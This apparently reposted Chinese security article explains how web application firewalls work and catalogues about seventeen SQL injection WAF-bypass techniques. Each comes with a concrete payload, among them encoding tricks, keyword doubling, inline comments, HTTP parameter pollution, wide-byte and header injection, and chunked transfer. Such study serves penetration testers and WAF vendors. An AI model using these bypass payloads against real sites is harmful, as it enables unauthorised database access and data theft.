> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/VIYjlmCJ3J2bo8dpMH0e-Q)

本篇文章主要介绍 WAF 的一些基本原理，总结常见的 SQL 注入 Bypass WAF 技巧。WAF 是专门为保护基于 Web 应用程序而设计的，我们研究 WAF 绕过的目的一是帮助安服人员了解渗透测试中的测试技巧，二是能够对安全设备厂商提供一些安全建议，及时修复 WAF 存在的安全问题，以增强 WAF 的完备性和抗攻击性。三是希望网站开发者明白并不是部署了 WAF 就可以高枕无忧了，要明白漏洞产生的根本原因，最好能在代码层面上就将其修复。  

一、WAF 的定义
---------

WAF(Web 应用防火墙) 是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。通俗来说就是 WAF 产品里集成了一定的检测规则，会对每个请求的内容根据生成的规则进行检测并对不符合安全规则的作出对应的防御处理，从而保证 Web 应用的安全性与合法性。

二、WAF 的工作原理
-----------

WAF 的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录

### 1.   预处理

预处理阶段首先在接收到数据请求流量时会先判断是否为 HTTP/HTTPS 请求，之后会查看此 URL 请求是否在白名单之内，如果该 URL 请求在白名单列表里，直接交给后端 Web 服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。

### 2.   规则检测

每一种 WAF 产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。

### 3.   处理模块

针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端 Web 服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwQhicickEkia6TrmSibic9JUQKLvy9AhSF2ssYtdB9ECKq4xIdfUic7B7O00Q/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgw7ZhFicFPA11djNtNSdtibXHRNibZcduo9RW3ia1J8mRmILicUKx1RmrVdOw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwXwWq2G8XI9ZictG8TOuf7Cj8HYVcPRVN3jPeyBkJMiakxffDxVPqyQ2A/640?wx_fmt=jpeg)

不同的 WAF 产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款 WAF 产品，从而有目的性的进行 WAF 绕过。

### 4.   日志记录

WAF 在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。

三、WAF 的分类
---------

### 1.  软 WAF

软件 WAF 安装过程比较简单，需要安装到需要安全防护的 web 服务器上，以纯软件的方式实现。

代表产品：安全狗，云锁，D 盾等

### 2.  硬 WAF

硬件 WAF 的价格一般比较昂贵，支持多种方式部署到 Web 服务器前端，识别外部的异常流量，并进行阻断拦截，为 Web 应用提供安全防护。

代表产品有：Imperva、天清 WAG 等

### 3.   云 WAF

云 WAF 的维护成本低，不需要部署任何硬件设备，云 WAF 的拦截规则会实时更新。对于部署了云 WAF 的网站，我们发出的数据请求首先会经过云 WAF 节点进行规则检测，如果请求匹配到 WAF 拦截规则，则会被 WAF 进行拦截处理，对于正常、安全的请求则转发到真实 Web 服务器中进行响应处理。

代表产品有：阿里云云盾，腾讯云 WAF 等

### 4.   自定义 WAF

我们在平时的渗透测试中，更多情况下会遇到的是网站开发人员自己写的防护规则。网站开发人员为了网站的安全，会在可能遭受攻击的地方增加一些安全防护代码，比如过滤敏感字符，对潜在的威胁的字符进行编码、转义等。

四、WAF 的部署方式
-----------

> 1.   透明网桥
> 
> 2.   反向代理
> 
> 3.   镜像流量
> 
> 4.   路由代理

五、 绕 WAF 的多种方式
--------------

为了让大家更清楚的理解绕 WAF 的方法原理，本次 WAF 绕过方法的介绍中会增加部分代码示例。

注：本文的代码示例都是在 sqli-labs 基础上修改的。

正常无拦截规则的代码：

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwqR9GSWTzd9mII3RKoFAx1sscwcl3QiaJGTKDSdG9rO9ibXeZ4VD9jsCA/640?wx_fmt=jpeg)

接收用户传递的参数后直接带入数据库中执行。为了方便查看，将查询语句动态输出。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwNoJ6vFMAp7OU4AKYW9fD8xm7fqr4AXhdozAOPFNheTk8HUUibYtyxeA/640?wx_fmt=jpeg)![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwaQTgus7t2wmz2DvrQa5nib66wKvAJ5aKQDV6Zo6pJX572yCOEZK7VIg/640?wx_fmt=jpeg)

### 1.   各种编码绕过

绕 WAF 最常见的方法就是使用各种编码进行绕过，但编码能绕过的前提是提交的编码后的参数内容在进入数据库查询语句之前会有相关的解码代码。

a)   URL 编码：

增加了过滤规则的代码：

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwsgVo43vIzQKvLObib4A5T0ib9fQhQ5V1hXnAan1iabtsnWnxkUpXef68w/640?wx_fmt=jpeg)

代码中增加了特殊字符过滤，但在参数值进入数据库查询语句前多了一步解码操作：

```
$id= urldecode($id);
```

正常 payload：

```
?id=1' and '1'='2
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgw4Qdk0VqNHedZITgt8SibzXSoswOiaGUg9n0Tf1nibE5mibx2orZXCx2Vibg/640?wx_fmt=jpeg)

直接提交攻击语句，单引号被过滤，注入语句未成功插入。

绕过 payload：

```
?id= %31%2527%20%61%6e%64%20%2527%31%2527%3d%2527%32
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwyLSiaqdxqic5LsgVNCWOKuicn542bUBlibaic9vyDk0ia4fFUWd77x5DQ45A/640?wx_fmt=jpeg)

对参数值进行 URL 编码后可绕过过滤检测，注入语句成功写入。

b)  二次 URL 编码

增加了过滤规则的代码：

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwT4KEsSgoFv4hhH03L6gT28g3JXuQwUtJgbOq4XTc0lhkVY050YNd9A/640?wx_fmt=jpeg)

代码中在特殊字符过滤前又多增加了一步解码操作，可使用二次 URL 编码进行绕过。

正常 payload：

```
?id=1'and '1'='2?id=%31%2527%20%61%6e%64%20%2527%31%2527%3d%2527%32
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgw3VCfkhBzKERTMYJs252nJAfbCD9kMveIW3clTeB3oTrJXqa69LGNFg/640?wx_fmt=jpeg)

使用一次 URL 编码绕过后，由于在过滤前会进行一次解码操作，所以单引号还是被过滤掉，注入语句未成功插入。

绕过 payload：

```
?id=%25%33%31%25%32%35%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%35%32%37%25%33%31%25%32%35%32%37%25%33%64%25%32%35%32%37%25%33%32
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwQ83zlbMgicnAYIk15YiaHqh1I3gjRwPOZ5pO06KvLEMdxiczJcv8AP5hw/640?wx_fmt=jpeg)

使用二次 URL 编码后可绕过过滤检测，注入语句成功写入。

c)   其他编码

除了使用 URL 编码外，还可以使用其他的编码方式进行绕过尝试，例如 Unicode 编码，Base64 编码，Hex 编码，ASCII 编码等，原理与 URL 编码类似，此处不再重复。

### 2. 字母大小写转换绕过

部分 WAF 只过滤全大写 (SLEEP) 或者全小写 (sleep) 的敏感字符，未对 sleeP/slEEp 进行过滤，可对关键字进行大小写转换进行绕过。

增加了过滤规则的代码：

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwSQ6ibTQt1N5lYp7OQWVHibWWicu8fgqlYib7RKTic1iciaDWBc91xMJcZ5Ebg/640?wx_fmt=jpeg)

正常 payload：

```
?id=1' and sleep(3) and '1'='1?id=1' and SLEEP(3) and '1'='1
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwoKrQkXCXQCYiaRMwU1sicgibdylru6E23Y0pHxqsejy4VnSNaibpN5DOVQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwWWiaCoMDMvHAPmsaic9ceRf9SOd7ZzxiaicZK2XYLKFHt39MY6op2XjnAA/640?wx_fmt=jpeg)

绕过 payload：

```
?id=1' and sleeP(3) and '1'='1?id=1' and slEeP(3) and '1'='1
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgw9Zgx2cvINF6P4XLuu96VYxOg4chjWNWWCcXZG8I2N7avPJrzhT7FsA/640?wx_fmt=jpeg)

### 3. 空格过滤绕过

增加了过滤规则的代码：

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwibWPFGtoJOruAVuibFL6PyFLnVhpnfyCrpiaBzbuwJ5YzB5lSKM3IgQsw/640?wx_fmt=jpeg)

部分 WAF 会对空格过滤，可使用空白符或者‘+’号替换空格进行绕过。

a)   使用空白符替换空格绕过

<table width="679"><thead><tr><th>数据库类型</th><th>允许的空白符</th></tr></thead><tbody><tr><td>SQLite3</td><td>0A，0D，0C，09，20</td></tr><tr><td>MySQL5</td><td>09，0A，0B，0C，0D，A0，20</td></tr><tr><td>PosgresSQL</td><td>0A，0D，0C，09，20</td></tr><tr><td>Oracle 11g</td><td>00，0A，0D，0C，09，20</td></tr><tr><td>MSSQL</td><td>01，02，03，04，05，06，07，08，09，0A，0B，0C，0D，0E，0F，10，11，12，13，14，15，16，17，18，19，1A，1B，1C，1D，1E，1F，20</td></tr></tbody></table>

正常 payload：

```
?id=1'and sleep(3) and '1'='1
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwZrQx74LDZERPYL7RCXPvmNGDbiat4MX9HZqrIwVUYnlayRTMAwF9Twg/640?wx_fmt=jpeg)

空格被过滤，注入语句未成功插入。

绕过 payload：

```
?id=1'%0Aand%0Asleep(3)%0Aand%0A'1'='1
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgw8TBv4xD2A7ibN6bNkscb5OtbsEYlDNLMqfRMh2NcibtTdzibwicI4ibqopA/640?wx_fmt=jpeg)

注入语句成功写入

b)  使用‘+’替换空格绕过

绕过 payload：

```
?id=1'+and+sleep(3)+and+'1'='1 
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgw9zOAVopicRUXxubqYelTLCLAWb5SNmeWDH2GTCFDIVIpPBCrFC28zkw/640?wx_fmt=jpeg)

注入语句成功写入

c)   使用注释符 /**/ 替换空格绕过

绕过 payload：

```
 ?id=1'/**/and/**/sleep(3)/**/and/**/'1'='1
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwW2LPRUiaicpr4cCH1K1XuXgDFvMNTuLUhJsoEH0YPlYeSGoHg711hr4Q/640?wx_fmt=jpeg)

注入语句成功写入

### 4. 双关键字绕过

部分 WAF 会对关键字只进行一次过滤处理，可使用双关键字绕过。

增加了过滤规则的代码：

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwUzSwbkbn3tH3HtoVPBL1rARZlT5O2EluIjPzQTHE0fXQ40icSWsp4CQ/640?wx_fmt=jpeg)

正常 payload：

```
?id=1and SLeeP(3) and 1=1
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwFPsBFyAUKScfSgt9gfLlSiareoVEOx2QYuPSXGWZCic4em6z4blmibTdA/640?wx_fmt=jpeg)

由于使用了 strtolower() 函数，所以无法使用大小写转换进行绕过，注入语句未成功插入。

绕过 payload：

```
?id=1+and+SLesleepeP(3)+and+1=1 
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwtO2ianyoCP12oFZCR0T5cgshvwjFFzjticpRRCQDKNbVhPk4icBLXpU5g/640?wx_fmt=jpeg)

WAF 只对关键字 sleep 进行一次过滤，可使用 SLEsleepEP，进行一次过滤后成为 sleep，可绕过 WAF，注入语句成功写入。

### 5. 内联注释绕过

在 MySQL 里，/**/ 是多行注释，这个是 SQL 的标准，但是 MySQL 扩张了解释的功能，如果在开头的的 /* 后头加了惊叹号（/*!50001sleep(3)*/），那么此注释里的语句将被执行。

增加了过滤规则的代码：

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwtO2ianyoCP12oFZCR0T5cgshvwjFFzjticpRRCQDKNbVhPk4icBLXpU5g/640?wx_fmt=jpeg)

正常 payload：

```
?id=1+and+sleep(3)+and+1=2
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwrBkpP1Zk1K6BgeMdpSvdcyU1fqEhZcViacZibybmmv61gmJhdOW4ECMw/640?wx_fmt=jpeg)

绕过 payload：

```
?id=1+and+/*!50001sleep(3)*/+and+1=1
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwibYS1XVaicJG2mnib9wBeEfA7EYHGAxE2JGBEx18rLAGQf7e5uJtyoDBg/640?wx_fmt=jpeg)

### 6. 请求方式差异规则松懈性绕过

有些 WAF 同时接收 GET 方法和 POST 的方法，但只在 GET 方法中增加了过滤规则，可通过发送 POST 方法进行绕过。

增加了过滤规则的代码：

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwm42yib74AfY2UPUN9GdoHwVTL6iavcF9cqF5aaupPpdOAq1miat0JXbkw/640?wx_fmt=jpeg)

正常 payload：

```
GET /xxx/?id=1+and+sleep(4) 
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwmUlSrazOZkbOInvpwV4jVVGibOhYSaReMHdbeZ1Qic0vekZyZS7Zd9JQ/640?wx_fmt=jpeg)

绕过 payload：

```
POST /xxx/ id=1+and+sleep(4)
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwHXIuPat3mGIOqcaJXfkwIm0wvXbOO0bjQE0eDAPAnS2F8HibSPHmmmA/640?wx_fmt=jpeg)

发送 POST 请求，绕过过滤规则，注入语句成功写入。

### 7. 异常 Method 绕过

有些 WAF 只检测 GET，POST 方法，可通过使用异常方法进行绕过。

增加了过滤规则的代码：

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwibicTDzL9ia7W3EfngH0k0Hic1pumJqNHglnkd97l08g91wGqojzruJPLQ/640?wx_fmt=jpeg)

正常 payload：

```
 GET/xxx/?id=1+and+sleep(3) HTTP/1.1
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwILtiaz6ztEhnxBv4Q8nYGS3et8vjac4sfpFVgC21tNbTdp8aXEAWUQw/640?wx_fmt=jpeg)

绕过 payload：

```
DigApis /xxx/?id=1+and+sleep(3)HTTP/1.1
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwiaYCmywxicQVCnFKCBQVcgHUXE7NDTbJxibQTjPOYCZpyzo1Ake12SkPQ/640?wx_fmt=jpeg)

使用异常方法绕过过滤规则检测，注入语句成功写入。

### 8. 超大数据包绕过

部分 WAF 只检测固定大小的内容，可通过添加无用字符进行绕过检测

增加了过滤规则的代码：

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgw5rgx1UkFn8Zt5eVssAQkzxavFsvIH0BHCP95badq3tfxmt8e4zrAbg/640?wx_fmt=jpeg)

正常 payload：

```
?id=1+and+sleep(3) 
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwTODNadibr13PTG3Dmj5n7YkmUQwk7VFaXPjEo0l8DF8TicjS5OMKXdVQ/640?wx_fmt=jpeg)

绕过 payload：

```
 ?id=1+and+sleep(3)+and+111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgw3uajphCyicBdq65TicGMDyoKY5J2WKiapfCkBDIJrKyWEu4KjuUPyNNrQ/640?wx_fmt=jpeg)

添加无用字符，使内容大小超过 WAF 检测能检测到的最大内容。

### 9. 复参数绕过

在提交的 URL 中给一个参数多次赋了不同的值 (?id=1&id=2)，部分 WAF 在处理的过程中可能只处理前面提交的参数值 (id=1)，而后端程序在处理的时候可能取的是最后面的值。

正常 payload：

```
?id=1+and+sleep(3) 
```

绕过 payload：

```
?id=1&id=2+and+sleep(3) 
```

将攻击语句赋予最后一个 id 参数，可绕过 WAF 检测直接进入后端服务器。

### 10.   添加 % 绕过过滤

将 WAF 中过滤的敏感字符通过添加 % 绕过过滤。

例如：WAF 过滤了 select ，可通过 se%lect 绕过过滤, 在进入后端执行中对参数串进行 url 解码时，会直接过滤掉 % 字符，从而注入语句被执行。IIS 下的 asp.dll 文件在对 asp 文件后参数串进行 url 解码时，会直接过滤 % 字符。

正常 payload：

```
?id=1 union select 1, 2, 3 from admin?id=1union select 1, 2, 3 from admi
```

 绕过 payload：

```
?id=1 union s%e%lect 1, 2, 3 from admin?id=1union s%e%lect 1, 2, 3 from admin?id=1union s%e%lect 1, 2, 3 from admin?id=1union s%e%lect 1, 2, 3 from admin
```

### 11.   协议未覆盖绕过

以下四种常见的 content-type 类型：

> Content-Type:multipart/form-data;
> 
> Content-Type:application/x-www-form-urlencoded
> 
> Content-Type: text/xml
> 
> Content-Type: application/json

部分 WAF 可能只对一种 content-type 类型增加了检测规则，可以尝试互相替换尝试去绕过 WAF 过滤机制。

例如使用 multipart/form-data 进行绕过。

正常请求：

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwwSZHlUb0Zp5OSvpHzYia30aAojBC1wVX6kpHiaoRxDyfdjctQ1CjzECw/640?wx_fmt=jpeg)

转换为 multipart/form-data 类型进行绕过：

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwj8w6lPzUkxR8b9hJxxnChrn7aJhBTWACBY16x1pWDMgKWTVZrWHIEA/640?wx_fmt=jpeg)

### 12.   宽字节绕过

宽字节注入是因为使用了 GBK 编码。为了防止 sql 注入，提交的单引号 (%27) 会进行转义处理，即在单引号前加上斜杠(%5C%27)。

正常 payload：

```
?id=1'and 1=1--+ 
```

绕过 payload：

```
?id=1%df%27and 1=1--+
```

%df%27 经过转义后会变成 %df%5C%27,%df%5c 会被识别为一个新的字节，而 %27 则被当做单引号，成功实现了语句闭合。

### 13.   %00 截断

部分 WAF 在解析参数的时候当遇到 %00 时，就会认为参数读取已结束，这样就会只对部分内容进行了过滤检测。

正常 payload：

```
?a=1&id=1and sleep(3) 
```

绕过 payload：

```
 ?a=1%00.&id=1and sleep(3)
```

14.   Cookie/X-Forwarded-For 注入绕过
---------------------------------

部分 WAF 可能只对 GET，POST 提交的参数进行过滤，未对 Cookie 或者 X-Forwarded-For 进行检测，可通过 cookie 或者 X-Forwarded-For 提交注入参数语句进行绕过。

正常 payload：

```
GET /index.aspx?id=1+and+1=1 HTTP/1.1<br style="margin: 0px;padding: 0px;max-width: 100%;box-sizing: border-box;word-wrap: break-word !important;">Host: 192.168.61.175<br style="margin: 0px;padding: 0px;max-width: 100%;box-sizing: border-box;word-wrap: break-word !important;">...........
```

Cookie: TOKEN=F6F57AD6473E851F5F8A0E7A64D01E28;

绕过 payload：

```
GET /index.aspx HTTP/1.1<br style="margin: 0px;padding: 0px;max-width: 100%;box-sizing: border-box;word-wrap: break-word !important;">Host: 192.168.61.175<br style="margin: 0px;padding: 0px;max-width: 100%;box-sizing: border-box;word-wrap: break-word !important;">...........
```

Cookie:TOKEN=F6F57AD6473E851F5F8A0E7A64D01E28; id=1+and+1=1;

X-Forwarded-For:127.0.0.1';WAITFOR DELAY'0:0:5'--

### 15.   利用 pipline 绕过

当请求中的 Connection 字段值为 keep-alive，则代表本次发起的请求所建立的 tcp 连接不断开，直到所发送内容结束 Connection 为 close 为止。部分 WAF 可能只对第一次传输过来的请求进行过滤处理。

正常请求被拦截：

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwXia9HYcsGEjVVuMaJYsniazicxeqy3tkwBnj1e9ibpvicBibDPqlAVE1b9YA/640?wx_fmt=jpeg)

利用 pipline 进行绕过：

首先关闭 burp 的 Repeater 的 Content-Length 自动更新

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwI7wxia2hlcD4uZdzJHicm7kKloFBFoIJ3aclcDiagThxRhEAnPict9kRLQ/640?wx_fmt=jpeg)

修改 Connection 字段值为 keep-alive，将带有攻击语句的数据请求附加到正常请求后面再发送一遍。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwOL338Oocib2UUAWX4yXByYYB3YwTU8kg9CKOxmBvqoums2ja1XX8FRQ/640?wx_fmt=jpeg)

### 16.   利用分块编码传输绕过

分块传输编码是 HTTP 的一种数据传输机制，允许将消息体分成若干块进行发送。当数据请求包中 header 信息存在 Transfer-Encoding: chunked，就代表这个消息体采用了分块编码传输。

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwMHGG7bSDfGswVibFkobflqTncZUDyGxMXPSKTWYhibQia5JageXGqdv4Q/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/bMyibjv83iavwRBIgsYoFc5689Xu4wqXgwJ9kw1IZIGEpnbwlZWLpsLooAllXfcGVyVms1LJg8Js5P00GH9Kcv3g/640?wx_fmt=jpeg)

### 17.   冷门函数 / 字符 / 运算符绕过

```
floor() ==>  updatexml()，extractvalue()Substring() ==>  Mid()，Substr()，Lpad()，Rpad()，Left()concat() ==>  concat_ws()，group_concat()limit 0，1  ==>  limit1 offset 0and  ==> && or  ==> ||= ==>  <，>= ==>  likeSleep()  ==> benchmark()
```

六、总结
----

上面使用部分代码示例向大家介绍了一些基础的绕过 WAF 注入方法，但实际中的 WAF 检测规则错综复杂，需要我们通过手工或 fuzzing，并结合多种方法的组合拳去测试 WAF 检测原理，从而对抗 WAF。

* 本文作者：Amber，转载请注明来自 FreeBuf.COM。

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“如侵权请私聊公众号删文”

****扫描关注 LemonSec****  

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icncXiavFRorU03O5AoZQYznLCnFJLs8RQbC9sltHYyicOu9uchegP88kUFsS8KjITnrQMfYp9g2vQfw/640?wx_fmt=png)

**觉得不错点个 **“赞”**、“在看” 哦****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**